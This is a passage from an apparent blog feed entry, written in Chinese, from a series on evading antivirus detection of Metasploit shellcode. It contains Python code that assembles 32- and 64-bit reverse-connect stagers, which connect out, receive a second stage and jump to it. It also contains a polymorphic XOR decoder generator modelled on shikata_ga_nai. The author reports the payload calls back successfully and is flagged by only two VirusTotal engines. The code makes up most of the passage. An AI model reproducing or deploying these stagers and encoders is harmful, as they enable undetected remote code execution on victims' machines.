class="line"><span class="string">        recv:</span></span><br><span class="line"><span class="string">            pop ebx</span></span><br><span class="line"><span class="string">            mov ecx, esp</span></span><br><span class="line"><span class="string">            cdq</span></span><br><span class="line"><span class="string">            mov edx, 0x6A</span></span><br><span class="line"><span class="string">            mov al, 0x3</span></span><br><span class="line"><span class="string">            int 0x80  </span></span><br><span class="line"><span class="string">            test eax, eax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string">            jmp ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        failed:</span></span><br><span class="line"><span class="string">            mov eax, 0x1</span></span><br><span class="line"><span class="string">            mov ebx, 0x1 </span></span><br><span class="line"><span class="string">            int 0x80         </span></span><br><span class="line"><span class="string">        '''</span>.format(</span><br><span class="line">            retry_count = retry_count,</span><br><span class="line">            encoded_host=encoded_host,</span><br><span class="line">            encoded_port = encoded_port</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">        mmap:</span></span><br><span class="line"><span class="string">            xor    rdi, rdi</span></span><br><span class="line"><span class="string">            push   0x9</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            cdq</span></span><br><span class="line"><span class="string">            mov    dh, 0x10</span></span><br><span class="line"><span class="string">            mov    rsi, rdx</span></span><br><span class="line"><span class="string">            xor    r9, r9</span></span><br><span class="line"><span class="string">            push   0x22</span></span><br><span class="line"><span class="string">            pop    r10</span></span><br><span class="line"><span class="string">            mov    dl, 0x7</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            push  &#123;retry_count&#125;  </span></span><br><span class="line"><span class="string">            pop    r9</span></span><br><span class="line"><span class="string">            push   rax</span></span><br><span class="line"><span class="string">            push   0x29</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            cdq</span></span><br><span class="line"><span class="string">            push   0x2</span></span><br><span class="line"><span class="string">            pop    rdi</span></span><br><span class="line"><span class="string">            push   0x1</span></span><br><span class="line"><span class="string">            pop    rsi</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            xchg   rdi, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        connect:</span></span><br><span class="line"><span class="string">            mov    rcx, &#123;encoded_host&#125;&#123;encoded_port&#125;</span></span><br><span class="line"><span class="string">            push   rcx</span></span><br><span class="line"><span class="string">            mov    rsi, rsp</span></span><br><span class="line"><span class="string">            push   0x10</span></span><br><span class="line"><span class="string">            pop    rdx</span></span><br><span class="line"><span class="string">            push   0x2a</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            pop    rcx</span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            jns    recv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        handle_failure:</span></span><br><span class="line"><span class="string">            dec    r9</span></span><br><span class="line"><span class="string">            jz     failed</span></span><br><span class="line"><span class="string">            push   rdi</span></span><br><span class="line"><span class="string">            push   0x23</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            push   0x0</span></span><br><span class="line"><span class="string">            push   0x5</span></span><br><span class="line"><span class="string">            mov    rdi, rsp</span></span><br><span class="line"><span class="string">            xor    rsi, rsi</span></span><br><span class="line"><span class="string">            syscall              </span></span><br><span class="line"><span class="string">            pop    rcx</span></span><br><span class="line"><span class="string">            pop    rcx</span></span><br><span class="line"><span class="string">            pop    rdi</span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            jns    connect</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        failed:</span></span><br><span class="line"><span class="string">            push   0x3c</span></span><br><span class="line"><span class="string">            pop    rax</span></span><br><span class="line"><span class="string">            push   0x1</span></span><br><span class="line"><span class="string">            pop    rdi</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        recv:</span></span><br><span class="line"><span class="string">            pop    rsi</span></span><br><span class="line"><span class="string">            push   0x7E</span></span><br><span class="line"><span class="string">            pop    rdx</span></span><br><span class="line"><span class="string">            syscall </span></span><br><span class="line"><span class="string">            test   rax, rax</span></span><br><span class="line"><span class="string">            js     failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            jmp    rsi</span></span><br><span class="line"><span class="string">        '''</span>.format(</span><br><span class="line">            retry_count = retry_count,</span><br><span class="line">            encoded_host=encoded_host,</span><br><span class="line">            encoded_port = encoded_port.replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="comment"># print(shellcode)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encoding, count = ks.asm(shellcode)</span><br><span class="line">        <span class="keyword">return</span> encoding</span><br><span class="line">    <span class="keyword">except</span> k.KsError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: %s"</span> %e)</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure><p>主要是利用 keystone 这个汇编器对代码进行汇编，然后写入到elf文件中。<br>上述代码运行成功后，可以根据选择的架构生成 <code>64</code> 或者 <code>32</code> 位的elf文件，并且经过测试，功能都是正常的。</p><p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-23-09-54-18.png" alt=""></p><p>但是这样生成的二进制和利用 metasploit 直接生成的毫无差别，所以并不免杀。</p><p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-23-09-57-46.png" alt=""></p><p>接下来我们就尝试编写自己的编码器，使得可以完全构建出免杀的文件。</p><h2 id="编写shellcode编码器"><a href="#编写shellcode编码器" class="headerlink" title="编写shellcode编码器"></a>编写shellcode编码器</h2><p>在上一篇文章中，主要写了编码器 <code>x86/shikata_ga_nai</code> 比较容易被识别的一些静态特征，本文也不做太多的深入研究，我们就简单的修改metasploit的encoder <code>x86/shikata_ga_nai</code> 的代码，试图去除这些比较明显的静态特征，看是否能够满足当前的免杀需求。</p><p>首先我们模仿一下编码器 <code>x86/shikata_ga_nai</code> 的代码结构，来生成一个用来解密 shellcode 的 decoder_sub,代码实现如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_shikata_block</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">        regs = [ <span class="string">"eax"</span>,<span class="string">"ebx"</span>,<span class="string">"ecx"</span>,<span class="string">"edx"</span>,<span class="string">"esi"</span>,<span class="string">"edi"</span> ]</span><br><span class="line">        stack_base = <span class="string">"ebp"</span></span><br><span class="line">        stack_head = <span class="string">"esp"</span></span><br><span class="line">        addr_size = <span class="number">0x4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        regs = [ <span class="string">"rax"</span>,<span class="string">"rbx"</span>,<span class="string">"rcx"</span>,<span class="string">"rdx"</span>,<span class="string">"rsi"</span>,<span class="string">"rdi"</span>  ] </span><br><span class="line">        stack_base = <span class="string">"rbp"</span></span><br><span class="line">        stack_head = <span class="string">"rsp"</span>  </span><br><span class="line">        addr_size = <span class="number">0x8</span> </span><br><span class="line">    </span><br><span class="line">    fpus = []</span><br><span class="line">    fpus += [ bytes([<span class="number">0xd9</span>,i])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xe8</span>,<span class="number">0xee</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xd9</span>,i])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xcf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xda</span>,i])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xdf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xdb</span>,i ])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xcf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    fpus += [ bytes([<span class="number">0xdd</span>,i ])  <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">0xc0</span>,<span class="number">0xcf</span>+<span class="number">1</span>)   ]</span><br><span class="line">    <span class="comment"># fpus += [ b"\xd9\xd0",b"\xd9\xe1",b"\xd9\xf6",b"\xd9\xf7",b"\xd9\xe5" ]</span></span><br><span class="line"></span><br><span class="line">    ks = k.Ks(k.KS_ARCH_X86,MODE)</span><br><span class="line"></span><br><span class="line">    code = []</span><br><span class="line">    <span class="comment"># print( random.choice(fpus) )</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append_code</span><span class="params">(code,asm=None,bytes_code=None,compile=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">          code = [</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    "index":"当前指令偏移",</span></span><br><span class="line"><span class="string">                    "asm":"助记符",</span></span><br><span class="line"><span class="string">                    "bytes_code":[12,34] # 编译后的整形</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ]</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> len(code):</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            last = code[<span class="number">-1</span>]</span><br><span class="line">            index = last[<span class="string">"index"</span>] + len(last[<span class="string">"bytes_code"</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> compile:</span><br><span class="line">            code.append(&#123;</span><br><span class="line">                <span class="string">"index"</span>:index,</span><br><span class="line">                <span class="string">"asm"</span>:asm,</span><br><span class="line">                <span class="string">"bytes_code"</span>:[i <span class="keyword">for</span> i <span class="keyword">in</span> bytes_code]</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                encoding, count = ks.asm(asm)</span><br><span class="line">                code.append(&#123;</span><br><span class="line">                    <span class="string">"index"</span>:index,</span><br><span class="line">                    <span class="string">"asm"</span>:asm,</span><br><span class="line">                    <span class="string">"bytes_code"</span>:encoding</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> k.KsError <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"ERROR: %s"</span> %e)</span><br><span class="line">                <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">    code = append_code( </span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format( stack_base,stack_head )</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># code += []</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"sub &#123;&#125;,&#123;&#125;"</span>.format( stack_head, addr_size * <span class="number">0x4</span> )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    reg_caches = []</span><br><span class="line"></span><br><span class="line">    reg_caches.extend( [<span class="string">"rcx"</span>,<span class="string">"ecx"</span>] )</span><br><span class="line"></span><br><span class="line">    reg_1 = random.choice(reg_caches)</span><br><span class="line">    <span class="keyword">while</span> reg_1 <span class="keyword">in</span> reg_caches:</span><br><span class="line">        reg_1 = random.choice(regs)</span><br><span class="line"></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format( reg_1,stack_head)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#fpus command</span></span><br><span class="line"></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"fpus"</span>,</span><br><span class="line">        bytes_code = random.choice( fpus ),</span><br><span class="line">        compile=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format( reg_1,stack_head)] </span></span><br><span class="line">    location_ss = random.randint(<span class="number">3</span>,<span class="number">12</span>) </span><br><span class="line">    <span class="comment"># code += ["fnstenv [&#123;&#125; - &#123;&#125;]".format(reg_1,hex(location_ss * 4))]</span></span><br><span class="line">    code = append_code(</span><br><span class="line">            code,</span><br><span class="line">            asm = <span class="string">"fnstenv [&#123;&#125; - &#123;&#125;]"</span>.format(reg_1,hex(location_ss * <span class="number">4</span>))</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"sub &#123;&#125;,&#123;&#125;"</span>.format( stack_head,hex( (location_ss - <span class="number">3</span>)*<span class="number">4</span> ) )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"pop &#123;&#125;"</span>.format(reg_1)</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># code += ["sub esp,&#123;&#125;".format( hex( (location_ss - 3)*4 ) ) ]</span></span><br><span class="line">    <span class="comment"># code += ["pop &#123;&#125;".format(reg_1)]</span></span><br><span class="line"></span><br><span class="line">    key_table = [ i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x80</span>,<span class="number">0xFF</span>) ]</span><br><span class="line">    key = bytes([ random.choice( key_table ) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)  ])</span><br><span class="line">    print(<span class="string">"[*] the decode key is: &#123;&#125;."</span>.format(key))</span><br><span class="line">    key_int = struct.unpack(<span class="string">"&lt;I"</span>,key)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    reg_2 = random.choice( reg_caches )</span><br><span class="line">    <span class="keyword">while</span> reg_2 <span class="keyword">in</span> reg_caches:</span><br><span class="line">        reg_2 = random.choice(regs)</span><br><span class="line">    <span class="keyword">if</span> reg_2.startswith(<span class="string">"r"</span>):</span><br><span class="line">        reg_2 = reg_2.replace(<span class="string">"r"</span>,<span class="string">"e"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print( "mov &#123;&#125;,&#123;&#125;".format(reg_2,key_int )  )</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format(reg_2,key_int )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format(reg_2,key_int )]</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"xor ecx,ecx"</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># code += [ "xor ecx,ecx" ] # loop count</span></span><br><span class="line">    </span><br><span class="line">    code_length = len(shellcode) <span class="comment"># 修正这个长度</span></span><br><span class="line">    print(<span class="string">"[*] len of shellcode : &#123;&#125;."</span>.format(code_length))</span><br><span class="line">    code_length += <span class="number">4</span> + (<span class="number">4</span> - (code_length &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line">    print(<span class="string">"[*] encode length is: &#123;&#125;."</span>.format(code_length))</span><br><span class="line">    code_length //= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code_length &lt;= <span class="number">255</span>):</span><br><span class="line">        <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format("cl",code_length) ]</span></span><br><span class="line">        code = append_code(</span><br><span class="line">            code,</span><br><span class="line">            asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format(<span class="string">"cl"</span>,code_length)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> (code_length &lt;= <span class="number">65536</span>):</span><br><span class="line">        <span class="comment"># code += ["mov &#123;&#125;,&#123;&#125;".format("ecx",code_length) ]</span></span><br><span class="line">        code = append_code(</span><br><span class="line">            code,</span><br><span class="line">            asm=<span class="string">"mov &#123;&#125;,&#123;&#125;"</span>.format(<span class="string">"ecx"</span>,code_length)</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">    dd = <span class="number">0x23</span> <span class="comment"># header length</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">       # 查 intel 手册得知</span></span><br><span class="line"><span class="string">       xor [reg+offset],reg # 此变长指令在 offset &lt;= 0x7F 为定长三字节</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"decode: xor [&#123;&#125;+&#123;&#125;],&#123;&#125;"</span>.format( reg_1,dd,reg_2 )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    decode_label = code[<span class="number">-1</span>][<span class="string">"index"</span>]</span><br><span class="line">    <span class="comment"># code += [ "decode: xor [&#123;&#125;+&#123;&#125;],&#123;&#125;".format( reg_1,dd,reg_2 ) ] # 查 intel 手册得知此指令为 3 字节</span></span><br><span class="line">    <span class="comment"># code += [ "add &#123;&#125;,[&#123;&#125;+&#123;&#125;]".format( reg_2,reg_1,dd ) ] # 先不实现这个逻辑</span></span><br><span class="line"></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm = <span class="string">"add &#123;&#125;,4"</span>.format(reg_1)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    current_index = code[<span class="number">-1</span>][<span class="string">"index"</span>] + len( code[<span class="number">-1</span>][<span class="string">"bytes_code"</span>] ) </span><br><span class="line">    <span class="comment"># append loop </span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"loop decode"</span>,</span><br><span class="line">        bytes_code=<span class="string">b"\xe2"</span> + bytes( [<span class="number">0xFF</span> - (current_index + <span class="number">2</span> - decode_label) + <span class="number">1</span> ] ),</span><br><span class="line">        compile=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    all_code_length = code[<span class="number">-1</span>][<span class="string">"index"</span>] + len(code[<span class="number">-1</span>][<span class="string">"bytes_code"</span>])</span><br><span class="line">    fpus_addr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] original code:"</span>)</span><br><span class="line">    <span class="comment"># 计算fpus指令地址之后的指令长度，来修正 xor 指令的偏移</span></span><br><span class="line">    <span class="keyword">for</span> t,i <span class="keyword">in</span> enumerate(code):</span><br><span class="line">        print(<span class="string">"\t&#123;&#125;:\t&#123;&#125;\t\t&#123;&#125;"</span>.format(i[<span class="string">"index"</span>],i[<span class="string">"asm"</span>],i[<span class="string">"bytes_code"</span>]))</span><br><span class="line">        asm = i[<span class="string">"asm"</span>]</span><br><span class="line">        index = i[<span class="string">"index"</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"fpus"</span> <span class="keyword">in</span> asm:</span><br><span class="line">            fpus_addr = index</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"decode"</span> <span class="keyword">in</span> asm:</span><br><span class="line">            code[t][<span class="string">"bytes_code"</span>][<span class="number">2</span>] = all_code_length - fpus_addr - ( code_length * <span class="number">4</span> - len(shellcode) )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] fix code:"</span>)</span><br><span class="line"></span><br><span class="line">    decodeSub = []</span><br><span class="line">    <span class="keyword">for</span> t,i <span class="keyword">in</span> enumerate(code):</span><br><span class="line">        print( <span class="string">"\t&#123;&#125;:\t&#123;&#125;\t\t&#123;&#125;"</span>.format(i[<span class="string">"index"</span>],i[<span class="string">"asm"</span>],i[<span class="string">"bytes_code"</span>]))</span><br><span class="line">        decodeSub += i[<span class="string">"bytes_code"</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decodeSub,shellcode,code_length*<span class="number">4</span>,key</span><br><span class="line">    <span class="comment"># code += ["loop decode"]</span></span><br></pre></td></tr></table></figure><p><strong>代码是临时写的，所以逻辑比较乱。等以后有时间了开发一个框架出来，再进行优化吧</strong></p><p>接下来把 decodeSub 和 shellcode 的内容依据 <code>key</code> 进行加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrypt</span><span class="params">(decodeSub,shellcode,length,key)</span>:</span></span><br><span class="line">    key = [i <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    allcode = decodeSub  + shellcode</span><br><span class="line">    subCode = allcode[-length:]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> enumerate(subCode):</span><br><span class="line">        subCode[k] ^= key[ k%<span class="number">4</span> ]</span><br><span class="line">    </span><br><span class="line">    allcode[-length:] = subCode</span><br><span class="line">    <span class="keyword">return</span> allcode</span><br></pre></td></tr></table></figure><p>经过测试，shellcode 的功能正常，可以正常会连控制端:</p><p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-25-15-48-53.png" alt=""></p><p>上传到vt上进行检测:</p><p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-25-15-50-47.png" alt=""></p><p>竟然两个引擎报毒，这是出乎了我的意料，不过没关系，我们日后再慢慢解决。<br>本节内容到此为止。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/242551&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/242551&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一节我们利用模拟执行工具 unicorn 分析了 metasploit 生成的 shellcode 的执行过程和编码器 &lt;code&gt;x86/shikata_ga_nai&lt;/code&gt; 的解码逻辑， 并依据 metasploit 的源代码分析了 payload 的生成过程。&lt;br&gt;从生成过程中我们也可以发现编码器的静态特征比较明显，容易被反病毒软件静态识别。为了逃避过杀毒软件的静态查杀，本文主要讲解如何实现自己的编码器进行代码编码并且手工构建ELF文件，因为ruby语言实在的不熟悉，所以本文暂时不会基于metasploit开发，主要还是使用我比较顺手的语言 python 进行开发。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="杀软的无奈" scheme="http://blog.wonderkun.cc/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/"/>
    
  </entry>
  
  <entry>
    <title>杀软的无奈-metasploit的shellcode loader分析(三)</title>
    <link href="http://blog.wonderkun.cc/2021/04/25/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-metasploit%E7%9A%84shellcode%E5%88%86%E6%9E%90(%E4%B8%89)/"/>
    <id>http://blog.wonderkun.cc/2021/04/25/杀软的无奈-metasploit的shellcode分析(三)/</id>
    <published>2021-04-25T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
